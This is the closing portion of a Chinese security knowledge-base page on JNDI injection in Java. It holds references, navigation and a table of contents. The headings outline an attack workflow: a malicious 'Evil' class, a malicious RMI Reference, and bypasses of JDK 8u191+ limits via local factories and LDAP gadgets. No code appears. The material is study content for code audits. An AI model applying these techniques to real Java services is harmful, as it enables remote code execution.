0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="参考">参考<a href="#参考" class="hash-link" aria-label="参考的直接链接" title="参考的直接链接">​</a></h2>
<ul>
<li>
<p><a href="https://paper.seebug.org/417/" target="_blank" rel="noopener noreferrer">关于 JNDI 注入</a></p>
</li>
<li>
<p><a href="https://p0rz9.github.io/2019/05/05/6.JNDI%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/" target="_blank" rel="noopener noreferrer">JNDI注入入门</a></p>
</li>
<li>
<p><a href="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%906.JNDI%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener noreferrer">浅析JNDI注入</a></p>
</li>
<li>
<p><a href="https://www.cnblogs.com/0x7e/p/14578370.html#0x04%E3%80%81jndi%E5%8A%A8%E6%80%81%E5%8D%8F%E8%AE%AE%E8%BD%AC%E6%8D%A2" target="_blank" rel="noopener noreferrer">who is JNDI？</a></p>
</li>
</ul></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/代码审计/Java安全/审计基础/RMI基础"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">RMI基础</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/代码审计/Java安全/审计基础/IDEA断点调试"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">IDEA断点调试</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#背景知识" class="table-of-contents__link toc-highlight">背景知识</a><ul><li><a href="#jndi-service-provider" class="table-of-contents__link toc-highlight">JNDI Service Provider</a></li><li><a href="#objectfactory" class="table-of-contents__link toc-highlight">ObjectFactory</a></li></ul></li><li><a href="#jndi概述" class="table-of-contents__link toc-highlight">JNDI概述</a></li><li><a href="#jndi类" class="table-of-contents__link toc-highlight">JNDI类</a><ul><li><a href="#initialcontext类" class="table-of-contents__link toc-highlight">InitialContext类</a><ul><li><a href="#构造方法" class="table-of-contents__link toc-highlight">构造方法</a></li><li><a href="#常用方法" class="table-of-contents__link toc-highlight">常用方法</a></li></ul></li><li><a href="#reference类" class="table-of-contents__link toc-highlight">Reference类</a><ul><li><a href="#构造方法-1" class="table-of-contents__link toc-highlight">构造方法</a></li><li><a href="#常用方法-1" class="table-of-contents__link toc-highlight">常用方法</a></li></ul></li></ul></li><li><a href="#jndi代码实现" class="table-of-contents__link toc-highlight">JNDI代码实现</a><ul><li><a href="#实现过程" class="table-of-contents__link toc-highlight">实现过程</a></li><li><a href="#实现举例" class="table-of-contents__link toc-highlight">实现举例</a><ul><li><a href="#hellointerfaceclass定义远程接口" class="table-of-contents__link toc-highlight">HelloInterface.class（定义远程接口）</a></li><li><a href="#helloimplclasshellointerface远程接口实现类" class="table-of-contents__link toc-highlight">HelloImpl.class（HelloInterface远程接口实现类）</a></li><li><a href="#serverclass注册远程对象并绑定" class="table-of-contents__link toc-highlight">Server.class（注册远程对象并绑定）</a></li><li><a href="#clientclass远程调用" class="table-of-contents__link toc-highlight">Client.class（远程调用）</a></li></ul></li></ul></li><li><a href="#jndi动态协议转换" class="table-of-contents__link toc-highlight">JNDI动态协议转换</a></li><li><a href="#jndi-naming-reference" class="table-of-contents__link toc-highlight">JNDI Naming Reference</a></li><li><a href="#jndi注入" class="table-of-contents__link toc-highlight">JNDI注入</a><ul><li><a href="#jndi注入原理" class="table-of-contents__link toc-highlight">JNDI注入原理</a></li><li><a href="#jndi注入的利用条件" class="table-of-contents__link toc-highlight">JNDI注入的利用条件</a></li><li><a href="#jndi注入攻击流程" class="table-of-contents__link toc-highlight">JNDI注入攻击流程</a></li><li><a href="#jndi注入举例" class="table-of-contents__link toc-highlight">JNDI注入举例</a><ul><li><a href="#创建恶意类evil不能带package" class="table-of-contents__link toc-highlight">创建恶意类Evil（不能带package）</a></li><li><a href="#常见rmi服务端绑定恶意的reference到rmi注册表" class="table-of-contents__link toc-highlight">常见RMI服务端，绑定恶意的Reference到rmi注册表</a></li><li><a href="#客户端远程调用evil对应类" class="table-of-contents__link toc-highlight">客户端远程调用evil对应类</a></li><li><a href="#步骤" class="table-of-contents__link toc-highlight">步骤</a></li></ul></li><li><a href="#jndi注入debug" class="table-of-contents__link toc-highlight">JNDI注入Debug</a></li></ul></li><li><a href="#绕过高版本jdk8u191限制" class="table-of-contents__link toc-highlight">绕过高版本JDK（8u191+）限制</a><ul><li><a href="#关于codebase" class="table-of-contents__link toc-highlight">关于Codebase</a></li><li><a href="#关于jndi-naming-reference的限制" class="table-of-contents__link toc-highlight">关于JNDI Naming Reference的限制</a></li><li><a href="#绕过高版本jdk限制利用本地class作为reference-factory" class="table-of-contents__link toc-highlight">绕过高版本JDK限制：利用本地Class作为Reference Factory</a><ul><li><a href="#利用举例" class="table-of-contents__link toc-highlight">利用举例</a><ul><li><a href="#pomxml双方均需要" class="table-of-contents__link toc-highlight">pom.xml（双方均需要）</a></li><li><a href="#server" class="table-of-contents__link toc-highlight">Server</a></li><li><a href="#client" class="table-of-contents__link toc-highlight">Client</a></li></ul></li><li><a href="#几种变体的表达式" class="table-of-contents__link toc-highlight">几种变体的表达式</a></li><li><a href="#debug分析" class="table-of-contents__link toc-highlight">Debug分析</a></li><li><a href="#总结" class="table-of-contents__link toc-highlight">总结</a></li></ul></li><li><a href="#绕过高版本jdk限制利用ldap返回序列化数据触发本地gadget" class="table-of-contents__link toc-highlight">绕过高版本JDK限制：利用LDAP返回序列化数据，触发本地Gadget</a><ul><li><a href="#利用举例-1" class="table-of-contents__link toc-highlight">利用举例</a><ul><li><a href="#生成poc" class="table-of-contents__link toc-highlight">生成POC</a></li><li><a href="#ldap-server" class="table-of-contents__link toc-highlight">LDAP Server</a></li><li><a href="#client-1" class="table-of-contents__link toc-highlight">Client</a></li></ul></li><li><a href="#debug分析-1" class="table-of-contents__link toc-highlight">Debug分析</a><ul><li><a href="#调用栈" class="table-of-contents__link toc-highlight">调用栈</a></li></ul></li><li><a href="#建议" class="table-of-contents__link toc-highlight">建议</a></li></ul></li></ul></li><li><a href="#参考" class="table-of-contents__link toc-highlight">参考</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 d4m1ts 知识库.</div></div></div></footer></div>
</body>
</html>